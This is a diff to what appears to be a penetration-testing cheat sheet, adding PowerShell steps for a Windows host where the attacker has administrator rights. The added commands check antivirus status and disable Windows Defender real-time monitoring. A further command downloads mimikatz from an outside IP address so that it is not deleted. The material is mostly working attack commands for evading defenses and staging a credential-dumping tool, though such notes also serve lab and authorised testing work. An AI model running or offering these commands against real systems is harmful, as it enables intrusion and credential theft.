@@ -175,3 +175,14 @@ Import-Module .\PowerView.ps1
 > You can import modules now.
 
 ```
+# Disable Windows Defender in Powershell with Admin
+```
+Get-MpComputerStatus
+> You can check if Antivirus is enabled.
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+> Disable realtime monitoring.
+
+Invoke-WebRequest "http://192.168.45.239/mimikatz64.exe" -OutFile ".\m.exe"
+> Then You can download minikatz etc. without deleted.
+```
